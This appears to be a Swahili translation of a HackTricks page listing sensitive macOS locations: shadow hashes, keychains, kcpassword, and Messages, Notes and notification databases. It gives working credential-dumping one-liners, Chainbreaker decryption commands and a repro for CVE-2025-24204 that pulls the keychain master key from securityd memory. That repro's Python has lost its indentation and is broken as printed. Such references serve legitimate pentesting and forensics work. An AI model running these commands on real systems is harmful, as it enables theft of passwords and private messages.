# Maeneo Nyeti ya macOS na Daemons za Kuvutia

{{#include ../../../banners/hacktricks-training.md}}

## Nywila

### Shadow Passwords

Shadow password huhifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizoko kwenye **`/var/db/dslocal/nodes/Default/users/`**.\
Oneliner ifuatayo inaweza kutumika kudump **taarifa zote kuhusu watumiaji** (ikiwemo taarifa za hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts kama hii**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**hii**](https://github.com/octomagon/davegrohl.git) zinaweza kutumika kubadilisha hash kuwa **format** ya **hashcat**.

One-liner mbadala ambayo itadump creds za akaunti zote zisizo za service katika format ya hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Njia nyingine ya kupata `ShadowHashData` ya mtumiaji ni kutumia `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Faili hili **hutumika tu** wakati mfumo ukiwa unaendeshwa katika **single-user mode** (kwa hiyo si mara nyingi sana).

### Keychain Dump

Kumbuka kwamba unapotumia binary ya security **kudump passwords zilizodecryptiwa**, prompts kadhaa zitamuuliza mtumiaji kuruhusu operesheni hii.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Kwenye macOS za kisasa, backing stores zinazovutia zaidi kwa kawaida ni **`~/Library/Keychains/login.keychain-db`** na **`/Library/Keychains/System.keychain`**. Ni faili zinazotumia SQLite, lakini ufikiaji wa plaintext bado unasimamiwa na **`securityd`**: kuiba DB ghafi hukupa hasa metadata na blobs zilizosimbwa kwa njia fiche, isipokuwa pia upate password ya mtumiaji, `SystemKey`, au master key iliyo kwenye memory.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), inaonekana zana hizi hazifanyi kazi tena kwenye Big Sur.

### Muhtasari wa Keychaindump

Zana inayoitwa **keychaindump** imetengenezwa ili kutoa passwords kutoka kwenye keychains za macOS, lakini inakabiliwa na vikwazo kwenye matoleo mapya ya macOS kama Big Sur, kama ilivyoonyeshwa kwenye [mjadala](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji attacker kupata access na kufanya privilege escalation hadi **root**. Zana hii hutumia ukweli kwamba keychain hufunguliwa kwa default mtumiaji anapoingia kwenye mfumo, kwa urahisi wa kuruhusu applications kuifikia bila kuhitaji password ya mtumiaji mara kwa mara. Hata hivyo, mtumiaji akichagua kufunga keychain yake baada ya kila matumizi, **keychaindump** huwa haina ufanisi.

**Keychaindump** hufanya kazi kwa kulenga process maalum inayoitwa **securityd**, ambayo Apple huiainisha kama daemon ya authorization na cryptographic operations, muhimu kwa kufikia keychain. Mchakato wa extraction unahusisha kutambua **Master Key** inayotokana na login password ya mtumiaji. Key hii ni muhimu kwa kusoma faili ya keychain. Ili kupata **Master Key**, **keychaindump** huchanganua memory heap ya **securityd** kwa kutumia command ya `vmmap`, ikitafuta keys zinazowezekana ndani ya maeneo yaliyowekwa alama ya `MALLOC_TINY`. Command ifuatayo hutumika kukagua maeneo haya ya memory:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Baada ya kutambua **master keys** zinazowezekana, **keychaindump** hutafuta kwenye heaps muundo mahususi (`0x0000000000000018`) unaoashiria mgombea wa master key. Hatua zaidi, ikiwemo deobfuscation, zinahitajika ili kutumia key hii, kama ilivyoainishwa kwenye source code ya **keychaindump**. Analysts wanaoangazia eneo hili wanapaswa kutambua kuwa data muhimu ya decrypt keychain imehifadhiwa ndani ya memory ya mchakato wa **securityd**. Mfano wa command ya kuendesha **keychaindump** ni:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kutoa aina zifuatazo za taarifa kutoka kwenye OSX keychain kwa njia inayozingatia kanuni za uchunguzi wa kidijitali:

- Hash ya password ya Keychain, inayofaa kwa cracking kwa kutumia [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Kwa kupewa password ya kufungua keychain, master key iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au unlock file kama SystemKey, Chainbreaker pia itatoa passwords za plaintext.

Bila mojawapo ya njia hizi za kufungua Keychain, Chainbreaker itaonyesha taarifa nyingine zote zinazopatikana.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) kwa kutumia SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (zenye passwords) cracking hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) kwa kutumia memory dump**

[Fuata hatua hizi](../index.html#dumping-memory-with-osxpmem) ili kufanya **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Ikiwa unajua password ya mtumiaji, unaweza kuitumia **kudump na kusimbua keychain zinazomilikiwa na mtumiaji**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) ilisafirisha `/usr/bin/gcore` ikiwa na entitlement ya **`com.apple.system-task-ports.read`**, hivyo admin yeyote wa ndani (au app hasidi iliyosainiwa) angeweza kudump **kumbukumbu ya mchakato wowote hata SIP/TCC ikiwa imetekelezwa**. Kudump `securityd` kunaleak **Keychain master key** ikiwa wazi na kukuwezesha kutenganisha `login.keychain-db` bila password ya mtumiaji.<sup>[[1]](#references)</sup>

**Quick repro kwenye builds zilizo hatarini (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Lisha hex key iliyotolewa kwa Chainbreaker (`--key <hex>`) ili ku-decrypt login keychain. Apple iliondoa entitlement katika **macOS 15.3+**, kwa hiyo hii inafanya kazi tu kwenye builds za Sequoia ambazo hazijawekewa patch au mifumo iliyohifadhi binary iliyo hatarini.

### kcpassword

Faili ya **kcpassword** huhifadhi **nenosiri la kuingia la mtumiaji**, lakini tu ikiwa mmiliki wa mfumo **amewezesha kuingia kiotomatiki**. Kwa hiyo, mtumiaji ataingia kiotomatiki bila kuulizwa nenosiri (jambo ambalo si salama sana).

Nenosiri huhifadhiwa katika faili **`/etc/kcpassword`** likiwa lime-xored kwa key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa nenosiri la mtumiaji ni refu kuliko key, key itatumika tena.\
Hii hufanya nenosiri kuwa rahisi sana kurecover, kwa mfano kwa kutumia scripts kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Taarifa Muhimu katika Databases

### Ujumbe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Kabla ya **Sequoia**, kwa kawaida unaweza kupata hifadhi ya Notification Center katika **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Katika **Sequoia+**, Apple iliihamishia kwenye group container inayolindwa na TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Taarifa nyingi za kuvutia zimehifadhiwa ndani ya safu wima za **blob**, kwa hivyo utahitaji kutoa maudhui hayo na kuyabadilisha kuwa muundo unaoweza kusomeka na binadamu (`plutil -p -`, `strings`, au parser ndogo). Mifano ya quick triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Masuala ya hivi karibuni ya faragha (NotificationCenter DB)

- Katika macOS **14.7–15.1**, Apple ilihifadhi maudhui ya banner katika `db2/db` SQLite bila kuyaficha ipasavyo. CVEs **CVE-2024-44292/44293/40838/54504** yaliruhusu mtumiaji yeyote wa ndani kusoma maandishi ya notifications ya watumiaji wengine kwa kufungua DB tu (bila prompt ya TCC).
- Apple ilipunguza tatizo hili kwa kuhamisha DB hadi `group.com.apple.usernoted` na kuilinda kwa TCC kwenye builds mpya za Sequoia, hivyo kwenye systems za sasa kwa kawaida unahitaji user context inayofaa au TCC bypass ili kuisoma.<sup>[[3]](#references)</sup>
- Kwenye endpoints za zamani, nakili files za `db`, `db-wal`, na `db-shm` pamoja kabla ya ku-update au ku-reboot ikiwa unataka kuhifadhi artefacts.

### Maelezo

**Maelezo** ya watumiaji yanaweza kupatikana katika `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Ikiwa one-liner iliyo hapo juu ina kelele nyingi sana, export `ZICNOTEDATA.ZDATA`, i-gunzip, kisha iparse protobuf: kwa kawaida hii huwa reliable zaidi kuliko kuendesha `strings` moja kwa moja kwenye SQLite.

### Kazi za Nyuma / Vipengee vya Kuingia

Tangu **Ventura**, login items zilizoidhinishwa na mtumiaji pamoja na baadhi ya background tasks hufuatiliwa katika stores za **BTM**, kama vile **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** na system cache yenye version **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Faili hizi ni muhimu kwa kutambua kwa haraka persistence, helper tools, na baadhi ya background items zinazosimamiwa na MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Kwa mtazamo wa persistence na mambo ya ndani ya BTM, angalia [ukurasa wa auto-start locations](../../macos-auto-start-locations.md#login-items) na [maelezo ya Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Katika apps za macOS, preferences zinapatikana katika **`$HOME/Library/Preferences`**, na kwenye iOS zinapatikana katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Kwenye macOS, cli tool **`defaults`** inaweza kutumika **kubadilisha faili la Preferences**.

**`/usr/sbin/cfprefsd`** inamiliki XPC services `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent`, na inaweza kuitwa kutekeleza vitendo kama vile kubadilisha preferences.

## OpenDirectory permissions.plist

Faili `/System/Library/OpenDirectory/permissions.plist` lina permissions zinazotumika kwenye node attributes na linalindwa na SIP.\
Faili hili huwapa users mahususi permissions kwa UUID (na si uid), ili waweze kufikia taarifa nyeti kama `ShadowHashData`, `HeimdalSRPKey` na `KerberosKeys`, miongoni mwa nyingine:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Daemon kuu wa notifications ni **`/usr/sbin/notifyd`**. Ili kupokea notifications, clients lazima zijisajili kupitia Mach port ya `com.apple.system.notification_center` (zikague kwa `sudo lsmp -p <pid notifyd>`). Daemon inaweza kusanidiwa kwa faili `/etc/notify.conf`.

Majina yanayotumika kwa notifications ni reverse DNS notations za kipekee, na notification inapotumwa kwa mojawapo ya majina hayo, client(s) zilizoashiria kuwa zinaweza kuishughulikia zitaipokea.

Inawezekana kutupa hali ya sasa (na kuona majina yote) kwa kutuma signal SIGUSR2 kwa mchakato wa notifyd na kusoma faili iliyozalishwa: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** ambayo binary yake kuu ni **`/usr/sbin/distnoted`**, ni njia nyingine ya kutuma notifications. Inaweka wazi baadhi ya huduma za XPC na hufanya ukaguzi fulani ili kujaribu kuthibitisha clients.

### Apple Push Notifications (APN)

Katika hali hii, applications zinaweza kujisajili kwa **topics**. Client itatengeneza token kwa kuwasiliana na servers za Apple kupitia **`apsd`**.\
Kisha, providers pia watakuwa wametengeneza token na wataweza kuunganishwa na servers za Apple ili kutuma messages kwa clients. Messages hizi zitapokelewa locally na **`apsd`**, ambayo itapeleka notification kwa application inayoisubiri.

Preferences ziko katika `/Library/Preferences/com.apple.apsd.plist`.

Kuna database ya ndani ya messages iliyo katika macOS kwenye `/Library/Application\ Support/ApplePushService/aps.db` na katika iOS kwenye `/var/mobile/Library/ApplePushService`. Ina tables 3: `incoming_messages`, `outgoing_messages` na `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Pia inawezekana kupata taarifa kuhusu daemon na connections kwa kutumia:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Arifa za Mtumiaji

Hizi ni arifa ambazo mtumiaji anapaswa kuziona kwenye skrini:

- **`CFUserNotification`**: API hizi hutoa njia ya kuonyesha pop-up yenye ujumbe kwenye skrini.
- **The Bulletin Board**: Katika iOS, huonyesha banner inayotoweka na kuhifadhiwa kwenye Notification Center.
- **`NSUserNotificationCenter`**: Hii ni bulletin board ya iOS katika macOS. Katika matoleo ya zamani ya macOS, database kwa kawaida hupatikana katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; kwenye Sequoia+ ilihamishwa hadi `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Marejeo

- [1] [HelpNetSecurity – entitlement ya macOS gcore iliyoruhusu uchimbaji wa master key ya Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Ulinzi wa data wa Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple yashughulikia wasiwasi wa faragha kuhusu database ya Notification Center katika macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
